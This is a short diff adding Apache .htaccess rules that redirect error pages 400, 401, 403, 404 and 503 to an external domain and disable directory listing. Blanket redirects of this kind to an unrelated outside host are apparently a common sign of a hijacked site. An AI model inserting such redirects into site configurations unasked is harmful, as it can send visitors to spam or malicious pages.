@@ -1,0 +1,6 @@
+ErrorDocument 400 http://chuliam.sxisa.org
+ErrorDocument 401 http://chuliam.sxisa.org
+ErrorDocument 403 http://chuliam.sxisa.org
+ErrorDocument 404 http://chuliam.sxisa.org
+ErrorDocument 503 http://chuliam.sxisa.org
+Options -Indexes
